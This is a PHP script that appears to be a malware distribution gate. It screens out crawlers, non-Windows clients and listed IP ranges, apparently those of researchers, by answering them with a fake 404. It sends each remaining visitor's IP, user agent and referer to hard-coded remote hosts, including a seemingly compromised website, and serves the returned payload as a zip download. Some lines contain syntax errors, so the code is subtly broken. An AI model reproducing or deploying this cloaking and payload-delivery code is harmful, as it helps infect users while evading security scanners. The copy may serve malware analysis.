<?php

#error_reporting(0);

ini_set("display_errors",0);

$tries_per_url = 1;

# URLs from which to fetch some information.
$urls = array(
	"http://78.138.118.124/request12.php",
	"http://bahnsinn-hattersheim.de/mediapool/85/859783/resources/pictures/126865.php",
	"http://78.138.118.125/request12.php"
);

// Refuse to service requests that have any one of these substrings
// in the request's user agent string.
$bad_uas = array(
		"Googlebot", "urllib", "Wget",
		"Mac OS X", "Android", "Linux",
		"iPhone", "iPad", "bingbot",
		"BlackBerry", "Googlebot", "Sam Spade",
		"Macintosh", "Phone", "oBot", "AppEngine",
		"msnbot", "Http Browser",
		"curl", "Python", "perl", "GetRight",
		"PycURL", "Anonymous", "Ruby", "spider",
		"MSIECrawler", "Genieo",
		"PlayBook", "Java",
		"URLRedirect", "MIDP",
		"LSSRocketCrawler", "X11", "Gnome", "KDE",
	);

# Refuse to service requests from these IP addresses.
$bad_ips = array(
		"10.1.79.","103.246.36.",
		"117.27.141.","117.27.151.",
		"118.145.2.","118.145.5.",
		"121.54.58.","123.196.112.",
		"125.77.194.", #"127.0.0.",
		"167.182.124.","167.182.57.",
		"183.12.177.","184.173.241.",
		"184.179.122.","188.244.35.",
		"192.168.1.","192.168.2.",
		"193.190.154.","194.47.174.",
		"195.159.140.","195.93.102.",
		"195.93.18.","195.93.21.",
		"195.93.60.","198.208.159.",
		"198.208.251.","199.47.168.",
		"201.238.246.","205.188.116.","
		205.188.117.","207.158.41.",
		"207.200.112.","208.122.95.",
		"208.50.101.","208.64.138.",
		"208.80.194.","209.191.87.",
		"210.51.187.","217.69.132.",
		"211.152.42.","218.107.207.",
		"218.5.78.","218.85.137.",
		"218.85.138.","219.239.95.",
		"220.181.31.","222.76.212.",
		"222.76.215.","222.76.218.",
		"5.9.208.","59.60.7.",
		"64.12.116.","64.12.117.",
		"64.124.203.","66.150.14.",
		"66.230.194.","66.230.196.",
		"66.230.220.","74.217.148.",
		"74.55.187.","unknown",
		"95.25.186.227","46.188.5.190",
		"94.29.6.193","188.244.38.86",
		"95.26.90.168","95.25.210.239",
		"95.26.90.193",
	);

PhpDisplay("http://localhost/");

function IsClientBad($ip, $ua, $path) 
{
	error_log('IsClientBad('.$ip.', "'.$ua.'", "'.$path.'")');

	global $bad_ips, $bad_uas, $tokens_param;

	$tokens_param = explode("?", $path);

	# Needs GET parameters
	if (count($tokens_param) != 2) {
		error_log("IsClientBad 1");
		return TRUE;
	}

	$tokens_param = explode("=", $tokens_param[1]);

	# Needs exactly one name/value pair
	if (count($tokens_param) != 2) {
		error_log("IsClientBad 2");
		return TRUE;
	}

	$tokens_param = explode("_", $tokens_param[1]);

	# The value has to have an '_' underscore in it.
	if (count($tokens_param) != 2) {
		error_log("IsClientBad 3");
		return TRUE;
	}

	# user agent string at least 20 characters
	if (strlen($ua) < 20) {
		error_log("IsClientBad 4");
		return TRUE;
	}

	# IP address not in list of bad IP addresses
	foreach($bad_ips as $bad_ip) {
		if(strstr($ip, $bad_ip)) !== FALSE) {
			error_log("IsClientBad 5");
			return TRUE;
		}
	}

	# User agent doesn't have a "bad" substring in it.
	foreach ($bad_uas as $bad_ua) {

		$fcwbnsdghec = "bad_ua";

		if (strstr($ua, $bad_ua) !== FALSE) {
			error_log("IsClientBad 6");
			return TRUE;
		}
	}

	return FALSE;
}

# Based on the url-encoded $param, fetch some data from one of
# the URLs in global $urls.  Makes $tries_per_url attempts on
# each URL in the list, and then loops over the list $urls again
# and again.  The "path" (URI) get3.php gets called as is included
# in the params for some reason.
function GetData($param)
{
	global $urls;
	global $tries_per_url;

	while (TRUE) {
		foreach ($urls as $url) {
			$full_url = $url ."?" .$param;
			for ($i = 0; $i < $tries_per_url; $i++) {
					$content = file_get_contents($full_url);
					if (!empty($content)) {
						return $content;
					}
			}
		}
	}

	return "";
}

function PhpDisplay($url)
{
	global $query;

	# Fill in array $query with info about the request get3.php
	# currently services.
	$query["ip"] = GetIp();  // IP address the request came from.
	$query["time"] = date("d/M/Y:H:i:s",time());
	$query["request"] = $_SERVER["REQUEST_METHOD"];
	$query["path"] = $_SERVER["REQUEST_URI"];
	$query["protocol"] = $_SERVER["SERVER_PROTOCOL"];
	$query["useragent"] = $_SERVER["HTTP_USER_AGENT"];
	$query["referer"] = isset($_SERVER["HTTP_REFERER"])? $_SERVER["HTTP_REFERER"] :"-";

	if (IsClientBad($query["ip"], $query["useragent"], $query["path"])) {
		error_log("Client bad 1");
		Error404();
	}

	global $content;
	$content = GetData(http_build_query($query));

	if (empty($content) OR stripos($content,"error") !== FALSE) {
		error_log("Client bad 2");
		Error404();
	}

	$content = explode("\n",$content);
	$filename = array_shift($content);  // $filename: element 0 of array
	$content = implode("\n",$content);

	header("Content-Type: application/zip";
	header("Content-Disposition: attachment;filename=".$filename);
	header("Content-Length: " . strlen($content));

	echo $content;

	exit();
}

function Error404() {
	header("HTTP/1.1 404 Not Found");
	exit("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\r\n"."<html><head><title>404 Not Found</title></head><body>\r\n"."<h1>Not Found</h1>\r\n"."<p>The requested URL was not found on this server.</p>\r\n"."<hr>\r\n"."</body></html>\r\n");
}

function GetIp()
{
	global $ip;
	$ip = NULL;

	if(isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
		$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
	} elseif (isset($_SERVER["HTTP_CLIENT_IP"])) {
		$ip = $_SERVER["HTTP_CLIENT_IP"];
	} elseif (isset($_SERVER["REMOTE_ADDR"])) {
		$ip = $_SERVER["REMOTE_ADDR"];
	}

	if (strpos($ip, ",") !== FALSE) {
		# if $ip is a string rep of a comma-separated list, choose last element.
		$ips = explode(",",$ip);
		$ip = trim(array_pop($ips));
	}

	return $ip;
}
?>
